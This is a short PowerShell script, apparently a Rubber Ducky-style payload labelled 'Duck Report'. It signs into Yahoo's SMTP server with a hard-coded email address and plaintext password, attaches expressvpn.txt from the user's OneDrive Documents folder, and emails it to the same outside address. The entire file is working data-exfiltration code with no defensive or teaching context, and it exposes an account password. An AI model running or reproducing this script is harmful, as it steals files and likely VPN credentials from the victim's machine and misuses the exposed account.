$SMTPServer = 'mail.yahoo.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ducky.rub@yahoo.com', 'Quentin8985!');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'ducky.rub@yahoo.com'
$ReportEmail.To.Add('ducky.rub@yahoo.com')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$files="$($env:USERPROFILE)\OneDrive\Documents\expressvpn.txt"
$ReportEmail.Attachments.Add($files)
$SMTPInfo.Send($ReportEmail)
